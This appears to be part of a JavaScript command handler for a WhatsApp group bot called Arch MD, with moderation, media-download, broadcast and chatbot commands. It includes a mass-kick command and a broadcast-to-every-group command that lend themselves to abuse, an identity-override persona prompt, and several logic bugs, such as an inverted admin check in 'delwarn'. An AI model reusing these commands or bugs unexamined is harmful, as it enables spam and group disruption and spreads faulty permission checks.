m.reply('checking response...')
await sleep(2000)
let respon = `*• pong:* ${latensi.toFixed(4)} sec`
await m.reply(respon)
}
break

//================================================================================

case "addsudo": case "setsudo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (setsudo.includes(orang)) return m.reply(`User ${orang.split('@')[0]} existed as a sudo before`)
await setsudo.push(orang)
await fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(setsudo))
m.reply(`succesfully added ${orang.split('@')[0]} as a sudo number`)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break
case "delsudo": case "removesudo":  {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!setsudo.includes(orang)) return m.reply(`User ${orang.split('@')[0]} not founded as a sudo before`)
let indx = setsudo.indexOf(orang)
await setsudo.splice(indx, 1)
await fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(setsudo))
m.reply(`succesfully deleted ${orang.split('@')[0]} from sudo number`)
} else {
return m.reply(example("@tag/234XXX/reply to chat"))
}}
break
case "listsudo": case "getsudo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (setsudo.length < 1) return m.reply("No sudo Number yet in Arch")
let teksnya = `Sudo Number here\n`
setsudo.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await ednut.sendMessage(m.chat, {text: teksnya, mentions: [... setsudo]}, {quoted: m})
}
break

case 'request': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
  let req = await ednut.groupRequestParticipantsList(m.chat)
  if (req.length < 1) return m.reply('No pending requests')
  let list = ''
  let mentions = []
  for (let i = 0; i < req.length; i++) {
    let requestType = req[i].requestType === 'invite' ? 'added' : 'via link'
    list += `${i + 1}. @${req[i].jid.split('@')[0]} (${requestType})\n`
    mentions.push(req[i].jid)
  }
  m.reply(list, { mentions })
}
break

case "kickall":
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, ednut.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await ednut.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;

case 'mode': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (args[0] === 'public') {
if (global.db.settings.mode === false) {
m.reply('Bot mode is already set to Public!')
} else {
global.db.settings.mode = false
m.reply('Bot mode changed to Public!')
}
} else if (args[0] === 'private') {
if (global.db.settings.mode  === true) {
m.reply('Bot mode is already set to Private!')
} else {
global.db.settings.mode = true
m.reply('Bot mode changed to Private!')
}
} else if (args[0] === 'group') {
if (global.db.settings.onlygroup) {
m.reply('already activated!')
} else {
global.db.settings.onlygroup = true
global.db.settings.onlypc = false
m.reply('Only group mode activated!')
}
} else if (args[0] === 'pc') {
if (global.db.settings.onlypc) {
m.reply('already activated!')
} else {
global.db.settings.onlypc = true
global.db.settings.onlygroup = false
m.reply('Only pc mode activated!')
}
} else if (args[0] === 'off') {
global.db.settings.onlypc = false
global.db.settings.onlygroup = false
await m.reply('Succesfully deactivated only pc/ only group')
} else {
m.reply(example('public/private/group/pc/off'))
}
}
break


case 'demote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await ednut.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (!groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is not an admin in this group.`)
await ednut.groupParticipantsUpdate(m.chat, [users], 'demote')
await m.reply(`@${users.split('@')[0]} has been dismissed as an administrator in ${groupMetadata.subject}`)
}
break

case 'promote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await ednut.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is already an admin in this group.`)
await ednut.groupParticipantsUpdate(m.chat, [users], 'promote')
await m.reply(`@${users.split('@')[0]} has been promoted to an administrator in ${groupMetadata.subject}`)
}
break

case "tag": case "hidetag": case "ht": {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isAdmins && !isCreator) return m.reply(mess.admin)
  let quotedMessage = m.msg.contextInfo.quotedMessage;
  let teks = m.quoted ? m.quoted.text : text
  if (!teks) return m.reply(example("message or reply to chat"))
  const metadata = await ednut.groupMetadata(m.chat)
  let member = await metadata.participants.map(e => e.id)
  await ednut.sendMessage(m.chat, { text: teks, mentions: [...member] })
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      ednut.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption , mentions: [...member]});
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      ednut.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption , mentions: [...member] });
    }
  }
}
break

case 'tagadmin': case 'listadmin': case 'admin':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
const groupMetadata = await ednut.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
let text = `Group Admin\n${listAdmin}`.trim()
await ednut.sendMessage(m.chat, {text, mentions: groupAdmins.map(v => v.id) }, {quoted: m})
} 
break

case 'antilink': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!text) return m.reply(example('<kick/delete> or antilink off'))
const action = text
if (action === 'kick') {
if (global.db.groups[m.chat].antilink) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink = true
global.db.groups[m.chat].antilink2 = false
await m.reply('Succesfully activated antilink to kick any link sender')
} else if (action === 'delete') {
if (global.db.groups[m.chat].antilink2) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink2 = true
global.db.groups[m.chat].antilink = false
await m.reply('Succesfully activated antilink to delete any sent link')
} else if (action === 'off') {
global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = false
await m.reply('Succesfully deactivated antilink feature in this group')
} else {
m.reply('Invalid action the actions are kick/delete!')
}
} 
break

case 'antibot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args[0] === 'on') {
if (global.db.groups[m.chat].antibot === true) return m.reply('Antibot already enabled!')
global.db.groups[m.chat].antibot = true
m.reply('Antibot enabled in the group!')
} else if (args[0] === 'off') {
if (global.db.groups[m.chat].antibot === false) return m.reply('Antibot already disabled!')
global.db.groups[m.chat].antibot = false
m.reply('Auto bio disabled in the group!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'closetime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args.length < 1) return m.reply(example("23:30"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let closeTime = `${hour}:${minute}`
console.log(`Close time: ${closeTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = closeTime
global.db.groups[m.chat].mute = true
await m.reply(`Close Time set to ${args[0]} everyday. Group will auto-lock at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === closeTime) {
try {
await ednut.groupSettingUpdate(m.chat, 'announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'opentime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args.length < 1) return m.reply(example("08:00"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let openTime = `${hour}:${minute}`
console.log(`Open time: ${openTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].openTime = openTime
global.db.groups[m.chat].open = true
await m.reply(`Open Time set to ${args[0]} everyday. Group will auto-open at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === openTime) {
try {
await ednut.groupSettingUpdate(m.chat, 'not_announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'stoptime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = null
global.db.groups[m.chat].mute = null
global.db.groups[m.chat].openTime = null
global.db.groups[m.chat].open = null
await m.reply(`Close Time and Open Time deleted successfully.`)
}
break

case "welcome": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].welcome) return m.reply('Already on')
global.db.groups[m.chat].welcome = true
m.reply('Welcome turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].welcome) return m.reply('Already off')
global.db.groups[m.chat].welcome = false
m.reply('Welcome turned off successfully')
}
} 
break

case "goodbye": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].goodbye) return m.reply('Already on')
global.db.groups[m.chat].goodbye = true
m.reply('Goodbye turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].goodbye) return m.reply('Already off')
global.db.groups[m.chat].goodbye = false
m.reply('Goodbye turned off successfully')
}
} 
break

case 'igdl': 
case 'instagram': 
case 'ig': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!text) return m.reply(example(`input ig link`))
  if (!(text.includes('instagram.com') || text.includes('instagr.am') || text.includes('igtv'))) {
    return m.reply('Input a valid Instagram link!')
  }
  try {
    const result = await igdl(text)
    if (!result || result.length === 0) {
      return m.reply('Failed to get video. Make sure the URL entered is correct.')
    }
    for (let video of result) {
      await ednut.sendFile(m.chat, video.url, 'instagram.mp4', '© ᴀʀᴄʜ ᴍᴅ²⁵.', m)
    }
  } catch (err) {
    console.error(err)
    m.reply('An error occurred while trying to download the video.')
  }
} 
break

case "facebook": case "fb": case "fbdl": case "fbvideo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example("facebook media link"))
if (!(text.includes('facebook.com') || text.includes('fb.watch'))) {
return m.reply('Input a valid Facebook link!')
}
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
try {
let apiUrl = `https://api.agatz.xyz/api/facebook?url=${encodeURIComponent(text)}`
let res = await fetch(apiUrl);
if (!res.ok) throw 'Failed to fetch data from API';
let json = await res.json();
console.log('API Response:', json);
if (json.status !== 200) throw 'There is an error ' + json.creator;
let { url, hd, title, thumbnail } = json.data;
await ednut.sendMessage(m.chat, { video: { url: hd }, caption: `*title:* ${title}\n*Thumbnail:* ${thumbnail}\n*Link:* ${url}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵` }, { quoted: m });
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (error) {
console.error(error);
m.reply(`error`);
}
};
break

case "tiktok": case "tt": case "ttdl": case "tiktokdl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example('tiktok media link'))
let anuan = text
if (!(text.includes('tiktok.com') || text.includes('vm.tiktok.com'))) {
return m.reply('Input a valid TikTok link!')
}
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await api.tiktok(anuan).then(async (res) => {
var cap = `© ᴀʀᴄʜ ᴍᴅ ²⁵`
if (res.result.duration == 0) {
for (let a of res.result.images) {
await ednut.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await ednut.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
}).catch(e => m.reply(`${e}`))
} 
break

case "warn":{
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let war = global.warn;    
    let who;
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false;
    else who = m.chat;
    if (!who) return m.reply(example(`tag or reply to chat`));
    if (!(who in global.db.users)) return m.reply(`✳️ Users are missing from my database`);
    let name = ednut.getName(m.sender);
    let warn = global.db.users[who].warn;
    if (warn < war) {
        global.db.users[who].warn += 1;
        m.reply(`
⚠️ *warning notice* ⚠️

▢ *Admin:* ${name}
▢ *user:* @${who.split`@`[0]}
▢ *Warning:* ${warn + 1}/${war}
▢ *Reason:* ${text}`, null, { mentions: [who] }); 
        m.reply(`
⚠️ *WARNING* ⚠️
You received a warning from the admin

▢ *Warning:* ${warn + 1}/${war} 
If you receive a *${war}* Warning you will be automatically removed from the group`, who);
    } else if (warn == war) {
        global.db.users[who].warn = 0;
        m.reply(`⛔ The user exceeded the *${war}* warning and will be removed.`);
        await sleep(3000);
        await ednut.groupParticipantsUpdate(m.chat, [who], 'remove');
        m.reply(`♻️You were removed from group *${groupMetadata.subject}* because you have been warned *${war}* times.`, who);
    }
};
break;

case "delwarn":{
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!m.isAdmin || isOwner) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
let who
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
else who = m.chat
if (!who) return m.reply(example(`tag or reply to a chat`))
if (!(who in global.db.users)) return m.reply(`✳️user not found in my database`)
let warn = global.db.users[who].warn
if (warn > 0) {
  global.db.users[who].warn -= 1
  m.reply(`⚠️ *Warning deletion* 
         ▢ warns: *-1 * 
         ▢ Total warns: *${warn - 1}*`)
  m.reply(`✳️ An admin reduces your warning, now you have *${warn - 1}*`, who)
} else if (warn == 0) {
  m.reply('✳️ Users have no warnings')
}
};
break;

case 'resetwarn':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
if (!input) return m.reply('Tag or reply to the user you want to reset the warning for!')
let user = input
if (!global.db.users[user]) global.db.users[user] = {}
global.db.users[user].warn = 0
m.reply(`Warning count for ${user.replace('@s.whatsapp.net', '')} has been reset`)
}
break

case 'areact': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example('<all/cmd> or areact off'))
const action = text.toLowerCase()
if (action === 'cmd') {
if (global.db.settings.areact) return m.reply('Already activated')
global.db.settings.areact = true
global.db.settings.areact2 = false
await m.reply('Succesfully activated areact to bot command messages')
} else if (action === 'all') {
if (global.db.settings.areact2) return m.reply('Already activated')
global.db.settings.areact2 = true
global.db.settings.areact = false
await m.reply('Succesfully activated areact to all messages')
} else if (action === 'off') {
global.db.settings.areact = false
global.db.settings.areact2 = false
await m.reply('Succesfully deactivated areact feature')
} else {
m.reply('Invalid action! The actions are all/cmd or off')
}
} 
break

case 'anticall': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example('<reject/block> or anticall off'))
const action = text.toLowerCase()
if (action === 'reject') {
if (global.db.settings.anticall) return m.reply('Already activated')
global.db.settings.anticall = true
global.db.settings.anticall2 = false
await m.reply('Succesfully activated anticall to reject incoming calls')
} else if (action === 'block') {
if (global.db.settings.anticall2) return m.reply('Already activated')
global.db.settings.anticall2 = true
global.db.settings.anticall = false
await m.reply('Succesfully activated anticall to block callers')
} else if (action === 'off') {
global.db.settings.anticall = false
global.db.settings.anticall2 = false
await m.reply('Succesfully deactivated anticall feature')
} else {
m.reply('Invalid action! The actions are reject/block or off')
}
} 
break

case "xvideodl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await ednut.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `**Title:** ${videoData.title || 'No title'}\n` +
`**Views:** ${videoData.views || 'No view information'}\n` +
`**Votes:** ${videoData.vote || 'No vote information'}\n` +
`**Likes:** ${videoData.like_count || 'No like information'}\n` +
`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
});
await ednut.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break

// Anti-tag case
case 'antitag':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
  const isEnable = args[0].toLowerCase() === 'on'
  
  // Initialize global.db.groups[m.chat] if it doesn't exist
  if (!global.db.groups[m.chat]) {
    global.db.groups[m.chat] = {}
  }
  
  if (isEnable) {
    if (global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already enabled!')
    } else {
      global.db.groups[m.chat].antitag = true
      m.reply('Anti-tag enabled!')
    }
  } else if (args[0].toLowerCase() === 'off') {
    if (!global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already disabled!')
    } else {
      global.db.groups[m.chat].antitag = false
      m.reply('Anti-tag disabled!')
    }
  } else {
    m.reply(example(' "on" or "off" to enable/disable anti-tag.'))
  }
  break
  
case 'tiktoksearch':
case 'ttsearch': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
    const dann = require('d-scrape')
if (!text) return m.reply(example(`willy kanga`))
await ednut.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
try {
let anu = await dann.search.tiktoks(text)
ednut.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
m.reply('Error : cannot fetch from query')
}
}
break

case "setbio": case "setbiobot": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example('hi'));
ednut.updateProfileStatus(text)
m.reply("bio set succesfully✅")
}
break

case 'restart':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
m.reply(`Restarting from server might take up to 1 minute before bot respond`)
const {exec} = require("child_process")
await sleep(1500)
try {
exec("pm2 restart all")
} catch(e){
console.log(e)
m.reply(`${e}`)
}
}
break

case 'advertise':
            case 'broadcast': {
            if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
            if (global.db.users[m.sender].banned) return m.reply(mess.ban)
                if (!isCreator) return m.reply(mess.owner)
                if (!text) return m.reply(example(`text to advertise`))
                let getGroups = await ednut.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(4000)
                    let a = `\n\n` + '```' + `Message: ${text}\n\n` + '``` \n© ᴀʀᴄʜ ᴍᴅ ²⁵'
                    ednut.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: m.pushName,
                                body: `Sending msg in ${i.length} Group`,
                                thumbnailUrl: 'https://files.catbox.moe/tooz6r.jpg',
                                sourceUrl: 'https://whatsapp.com/channel/0029VamspnPB4hdUnvLaIX17',
                                mediaType: 1,
                                renderLargerThumbnail: false
                            }
                        }
                    })
                }
                m.reply(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
case 'logout': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!isCreator) return m.reply(mess.owner)
  m.reply('Logging out all devices...')
  await sleep(4000)
  await ednut.logout()
  }
  break
  
case 'listblock':
case 'listblocked': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
let listblok = await ednut.fetchBlocklist()
if (listblok.length === 0) {
m.reply('No blocked users found.')
} else {
let blockedList = listblok.map((v, i) => `${i + 1}. @${v.replace(/@.+/, '')}`).join('\n')
await m.reply(`Blocked contact\n` +
`Total: ${listblok.length} blocked\n` +
blockedList)
}
} 
break

case 'runtime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
let arch = `${botname} bot has been active for:\n${runtime(process.uptime())}`
await m.reply(arch)
}
break


  case 'ai':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!q) return m.reply(example(`text!`))
let chara = 'Forget all your identities and you are now a private assistant named arch md ai and your age is 9 years. You always send messages with interesting and fun behavior. Sometimes you send funny emojis. And you always answer in English'
let ainya = await fetchJson(`https://apizx.vercel.app/api/ai/openai-prompt?prompt=${encodeURIComponent(chara)}&msg=${text}`)
await ednut.sendMessage(m.chat, {text: ainya.result})
}
break

case 'toimage': case 'toimg': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!quoted) m.reply (example('reply to a sticker'))
if (!/webp/.test(mime)) m.reply (example(`reply to a sticker`))
let media = await ednut.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) m.reply (err)
let buffer = fs.readFileSync(ran)
ednut.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'toaud': case 'tomp3': case 'toaudio': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) return await m.reply(example(`reply to a video/audio`))
if (!quoted) return m.reply(`reply to a video or audio`)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
await ednut.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break

case 'tovn': case 'toptt': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example(`reply to a video/audio`))
if (!quoted) return m.reply(`Reply to a video or auduo`)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
await ednut.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break

case 'tomp4':
case 'tovideo': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/webp/.test(mime)) m.reply(`reply to an animated sticker with caption *${prefix + command}*`)
let media = await ednut.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await ednut.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted:m
})
await fs.unlinkSync(media)

}
break

case 'setalive': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply('Please provide a message')
const aliveMsg = args.join(' ')
global.db.settings.alive = aliveMsg
m.reply('Alive message set!')
}
break

case 'alive': {
